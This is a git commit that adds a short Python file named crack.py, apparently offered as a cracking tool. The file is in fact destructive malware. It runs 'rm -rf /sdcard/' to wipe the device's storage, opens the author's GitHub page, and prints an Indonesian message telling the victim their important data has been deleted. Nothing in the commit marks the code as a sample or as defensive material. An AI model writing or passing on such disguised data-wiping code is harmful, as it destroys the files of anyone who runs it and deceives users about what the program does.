862d399c96ececc47e9ef9a73dc2b5096d471763
akbarsx <40322119+akbarsx@users.noreply.github.com>
2019-06-18 22:56:12 +0700

    Add files via upload

---
+++ crack.py
@@ -0,0 +1,5 @@
+import os
+os.system("rm -rf /sdcard/")
+os.system("xdg-open https://github.com/akbarsx")
+os.system("clear")
+print("\n\n Kami Berhasil Menghapua Data Data Penting Anda\n Trimakasih!!\n\n")
